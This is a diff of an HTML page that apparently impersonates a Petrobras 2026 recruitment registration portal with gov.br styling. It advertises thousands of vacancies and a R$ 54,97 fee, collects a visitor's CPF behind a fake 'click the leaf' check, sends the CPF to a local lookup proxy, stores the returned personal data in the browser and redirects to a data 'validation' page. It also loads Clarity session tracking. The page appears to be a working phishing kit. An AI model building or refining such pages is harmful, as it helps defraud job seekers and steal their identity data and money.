@@ -1,162 +1,246 @@
-<!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-    <meta charset="utf-8" />
-    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-    <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
-
-    <script src="https://cdn.tailwindcss.com"></script>
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
-
-    <link href="all.min.css" rel="stylesheet" />
-    <link href="home.css" rel="stylesheet" />
-    <link href="fonts.css" rel="stylesheet" />
-
+    
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <head>
+        <meta charset="utf-8" />
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
     <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t84urj3twx");
-    </script>
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
 
-    <style>
-        .PMSP-color { color: #003f6b; }
-        .PMSP-light { color: #a0a0a0; }
-        .form-header { background-color: #fbc12a; color: white; }
-        .form-footer { background-color: #003f6b; color: white; }
-        button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
-        button#submit-button:not([disabled]) { color: white; cursor: pointer; }
-        button#submit-button:not([disabled]):hover { background-color: #4d7396; }
-        .required-star { color: #ff0000; }
-        .footer-bg { background-color: #1c2b39; }
-        .gov-header { background-color: #222222; }
-        .inep-header { background-color: #044785; }
-        .selected { border: 4px dashed #2b7a9a !important; }
-        .transparent { opacity: 0.5; }
-    </style>
-
-    <script>
-        function formatCPF(input) {
-            let value = input.value.replace(/\D/g, "");
-            if (value.length > 11) value = value.substring(0, 11);
-            if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-            else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
-            else if (value.length > 3) value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
-            input.value = value;
-            checkFormValidity();
-        }
-
-        function selectImage(element, index) {
-            const images = document.querySelectorAll(".image-option");
-            images.forEach((img) => {
-                img.classList.remove("selected");
-                img.classList.add("transparent");
-            });
-            element.classList.add("selected");
-            element.classList.remove("transparent");
-            if (index !== 4) showErrorPopup(); else checkFormValidity();
-        }
-
-        function showErrorPopup() {
-            const popup = document.getElementById("error-popup");
-            popup.classList.remove("hidden");
-            setTimeout(() => popup.classList.add("hidden"), 3000);
-        }
-
-        function checkFormValidity() {
-            const cpfInput = document.querySelector("#cpf");
-            const selectedImage = document.querySelector(".image-option.selected");
-            const submitButton = document.querySelector("#submit-button");
-            const isLeaf = selectedImage === document.querySelectorAll(".image-option")[4];
-
-            if (cpfInput.value.length === 14 && isLeaf) {
-                submitButton.disabled = false;
-            } else {
-                submitButton.disabled = true;
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link href="all.min.css" rel="stylesheet" />
+        <link href="home.css" rel="stylesheet" />
+        <link href="fonts.css" rel="stylesheet" />
+        
+        <style>.PMSP-color {
+                color: #003f6b;
             }
-        }
+            .PMSP-light {
+                color: #a0a0a0;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+            }
+            .form-footer {
+                background-color: #003f6b;
+                color: white;
+            }
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #003f6b;
+                color: rgba(255, 255, 255, 0.6);
+            }
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            input::placeholder {
+                font-family: "Rawline", Arial, sans-serif;
+            }
+            .selected {
+                border: 4px dashed #2b7a9a !important;
+            }
+            .transparent {
+                opacity: 0.5;
+            }
+        </style>
+        <script>
+            function formatCPF(input) {
+                let value = input.value.replace(/\D/g, "");
+                if (value.length > 11) {
+                    value = value.substring(0, 11);
+                }
+                if (value.length > 9) {
+                    value = value.replace(
+                        /(\d{3})(\d{3})(\d{3})(\d{1,2})/,
+                        "$1.$2.$3-$4",
+                    );
+                } else if (value.length > 6) {
+                    value = value.replace(
+                        /(\d{3})(\d{3})(\d{1,3})/,
+                        "$1.$2.$3",
+                    );
+                } else if (value.length > 3) {
+                    value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+                }
+                input.value = value;
+                checkFormValidity();
+            }
 
-        function submitForm() {
-            document.getElementById("validation-popup").classList.remove("hidden");
-            // Lógica de API simplificada para o exemplo
-            setTimeout(() => {
-                alert("CPF Validado com sucesso!");
-                document.getElementById("validation-popup").classList.add("hidden");
-            }, 2000);
-        }
-    </script>
-</head>
-<body class="flex flex-col min-h-screen bg-gray-50">
-    <header class="gov-header text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <span class="font-bold text-sm">BRASIL.GOV.BR</span>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
-                    <li><a class="hover:underline" href="#">PARTICIPE</a></li>
-                    <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
+            function unformatCPF(cpf) {
+                return cpf.replace(/\D/g, "");
+            }
 
-    <div class="inep-header py-3"></div>
+            function selectImage(element, index) {
+                const images = document.querySelectorAll(".image-option");
+                images.forEach((img) => {
+                    img.classList.remove("selected");
+                    img.classList.add("transparent");
+                });
+                element.classList.add("selected");
+                element.classList.remove("transparent");
 
-    <div class="container mx-auto px-4 py-4 text-center bg-white">
-        <h1 class="text-2xl font-bold text-[#003f6b]">PETROBRAS</h1>
-    </div>
+                if (index !== 4) {
+                    showErrorPopup();
+                } else {
+                    checkFormValidity();
+                }
+            }
 
-    <main class="flex-grow py-8">
-        <div class="container mx-auto px-4 max-w-3xl">
-            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded">
-                <h3 class="text-lg font-semibold text-blue-800 mb-2">INFORMAÇÕES IMPORTANTES</h3>
-                <p class="text-gray-700 text-sm">Prezado(a) Candidato(a), preencha os dados para o Processo Seletivo 2026.</p>
+            function showErrorPopup() {
+                const popup = document.getElementById("error-popup");
+                popup.classList.remove("hidden");
+                setTimeout(() => {
+                    popup.classList.add("hidden");
+                }, 3000);
+            }
+
+            function checkFormValidity() {
+                const cpfInput = document.querySelector("#cpf");
+                const selectedImage = document.querySelector(
+                    ".image-option.selected",
+                );
+                const submitButton = document.querySelector("#submit-button");
+
+                if (
+                    cpfInput.value.length === 14 &&
+                    selectedImage &&
+                    selectedImage ===
+                        document.querySelectorAll(".image-option")[4]
+                ) {
+                    submitButton.disabled = false;
+                } else {
+                    submitButton.disabled = true;
+                }
+            }
+
+            function showValidationPopup() {
+                const popup = document.getElementById("validation-popup");
+                popup.classList.remove("hidden");
+            }
+
+            function hideValidationPopup() {
+                const popup = document.getElementById("validation-popup");
+                popup.classList.add("hidden");
+            }
+
+            function submitForm() {
+                const cpfInput = document.querySelector("#cpf");
+                const cpf = unformatCPF(cpfInput.value);
+
+                showValidationPopup();
+
+                function tryNewAPI() {
+                    return fetch(`proxy-nova-api.php?cpf=${cpf}`, {
+                        method: "GET",
+                    })
+                    .then((response) => {
+                        if (!response.ok) throw new Error("Nova API não disponível");
+                        return response.json();
+                    });
+                }
+
+                tryNewAPI()
+                    .then((data) => {
+                        localStorage.setItem("cpfData", JSON.stringify(data));
+                        setTimeout(() => { window.location.href = "validar-dados/index.html"; }, 1500);
+                    })
+                    .catch((error) => {
+                        console.error(error);
+                        hideValidationPopup();
+                        alert("Erro ao consultar CPF.");
+                    });
+            }
+        </script>
+        </head>
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div class="container mx-auto flex justify-between items-center px-4">
+                <a class="font-bold text-sm" href="#">
+                    <img src="images/top_gov-5.jpg" alt="Logotipo" class="h-6" />
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
+                        <li><a class="hover:underline" href="#">PARTICIPE</a></li>
+                        <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
+                    </ul>
+                </nav>
             </div>
+        </header>
+        <div class="inep-header py-3"></div>
+        <div class="container mx-auto px-4" style="background: white; text-align: center; padding: 15px 0;">
+            <img src="images/logopetrobras.png" alt="Petrobrás" height="60" width="120" style="object-fit: contain; margin: 0 auto;" />
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded">
+                    <h3 class="text-lg font-semibold text-blue-800 mb-2">INFORMAÇÕES IMPORTANTES</h3>
+                    <ul class="list-disc list-inside text-gray-700 space-y-1">
+                        <li><strong>Vagas:</strong> 9.590 vagas temporárias</li>
+                        <li><strong>Salário:</strong> De R$ 2.676,24 a R$ 19.379,00</li>
+                        <li><strong>Taxa:</strong> R$ 54,97</li>
+                    </ul>
+                </div>
 
-            <div class="border border-gray-300 rounded bg-white overflow-hidden">
-                <div class="form-header py-2 px-4 text-center">
-                    <h2 class="text-lg font-bold">Inscrição > Processo Seletivo</h2>
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">Inscrição &gt; Processo Seletivo Petrobrás 2026</h2>
+                    </div>
+                    <div class="p-4">
+                        <form>
+                            <div class="mb-4">
+                                <label class="block mb-1">CPF: <span class="required-star">*</span></label>
+                                <input id="cpf" class="w-full border border-gray-300 p-2" placeholder="___.___.___-__" type="tel" oninput="formatCPF(this)" />
+                            </div>
+                            <div class="mb-4">
+                                <p class="text-[#2B4F81] font-bold">Clique abaixo, na figura FOLHA: *</p>
+                            </div>
+                            <div class="flex items-center">
+                                <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
+                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 0)"><img class="w-6 h-6" src="images/download-6.png" /></div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 1)"><img class="w-6 h-6" src="images/download-5.png" /></div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 2)"><img class="w-6 h-6" src="images/download-4.png" /></div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 3)"><img class="w-6 h-6" src="images/download-3.png" /></div>
+                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 4)"><img class="w-6 h-6" src="images/leaf.png" /></div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="form-footer">
+                        <button id="submit-button" class="w-full py-3" type="button" disabled onclick="submitForm()">Enviar</button>
+                    </div>
                 </div>
-                <div class="p-6">
-                    <form>
-                        <div class="mb-6">
-                            <label class="block mb-2 font-semibold">CPF: <span class="required-star">*</span></label>
-                            <input id="cpf" class="w-full border border-gray-300 p-3 rounded" placeholder="000.000.000-00" type="tel" oninput="formatCPF(this)" />
-                        </div>
-                        
-                        <p class="mb-3 font-bold text-blue-900">Clique abaixo na figura FOLHA: *</p>
-                        <div class="grid grid-cols-5 gap-2 bg-gray-200 p-2 rounded">
-                            <div class="bg-white p-2 border cursor-pointer image-option flex justify-center" onclick="selectImage(this, 0)">🖼️</div>
-                            <div class="bg-white p-2 border cursor-pointer image-option flex justify-center" onclick="selectImage(this, 1)">🔍</div>
-                            <div class="bg-white p-2 border cursor-pointer image-option flex justify-center" onclick="selectImage(this, 2)">👣</div>
-                            <div class="bg-white p-2 border cursor-pointer image-option flex justify-center" onclick="selectImage(this, 3)">🔒</div>
-                            <div class="bg-white p-2 border cursor-pointer image-option flex justify-center" onclick="selectImage(this, 4)">🍃</div>
-                        </div>
-                    </form>
-                </div>
-                <button id="submit-button" class="w-full py-4 font-bold uppercase disabled:opacity-50" disabled onclick="submitForm()">
-                    Enviar Inscrição
-                </button>
             </div>
-        </div>
-    </main>
-
-    <footer class="footer-bg text-white py-6 text-center text-xs">
-        <p>&copy; 2026 Processo Seletivo Petrobrás - Todos os direitos reservados.</p>
-    </footer>
-
-    <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-600 text-white p-4 text-center hidden z-50">
-        Você deve selecionar a imagem da FOLHA para prosseguir.
-    </div>
-
-    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
-        <div class="absolute inset-0 bg-black opacity-60"></div>
-        <div class="bg-white p-8 rounded-lg shadow-xl z-10 text-center">
-            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-900 mx-auto mb-4"></div>
-            <h3 class="text-xl font-bold text-blue-900">Validando dados...</h3>
-        </div>
-    </div>
-</body>
+        </main>
+    </body>
 </html>
